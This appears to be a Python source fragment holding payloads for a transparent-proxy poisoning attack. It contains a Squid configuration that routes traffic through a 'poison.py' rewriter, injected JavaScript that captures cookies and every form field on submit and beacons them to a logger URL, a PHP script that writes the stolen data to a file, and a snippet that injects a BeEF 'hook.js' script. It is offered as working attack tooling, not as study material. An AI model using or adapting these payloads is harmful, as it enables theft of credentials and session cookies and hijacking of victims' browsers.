SCONF = """
http_port 8080
http_access allow all
reply_header_access Server deny all
memory_cache_mode disk
uri_whitespace encode
url_rewrite_program /etc/squid/poison.py
"""


PASARELA = """
//IGNORE
var URL = '//127.0.0.1/logger.php'
function attach_form(cadena){
  (new Image).src = URL+'?k='+encodeURIComponent(cadena);
}

(function(){
  var forms = parent.document.getElementsByTagName('form');
  for(i = 0; i < forms.length; i++){
    forms[i].addEventListener('submit', function(){
      var cadena = 'URL: '+document.URL;
      cadena += '%0aCookies: '+document.cookie+'%0a';
      var forms = parent.document.getElementsByTagName('form');
      for(x = 0; x < forms.length; x++){
        var elements = forms[x].elements;
        for(e = 0; e < elements.length; e++){
          cadena += elements[e].name + "%3A" + elements[e].value + "|";
        }
      }attach_form(cadena);
    }, false);
  }
})();
"""


LOGGER = """
<?php
if(!empty($_GET['k'])) {
    $file = 'logger.txt';
    $log = fopen($file, 'a+');
    fwrite($log, urldecode($_GET['k']));
    fwrite($log, "\\n----- ----- ----- ----- ----- ----- ----- ----- -----\\n");
    fclose($log);
}
?>
"""


BEEF = """
//IGNORE
(function(){
    var d = document;
    var script = d.createElement("script");
    script.src = "//127.0.0.1/hook.js";
    d.head.appendChild(script);
})();
"""
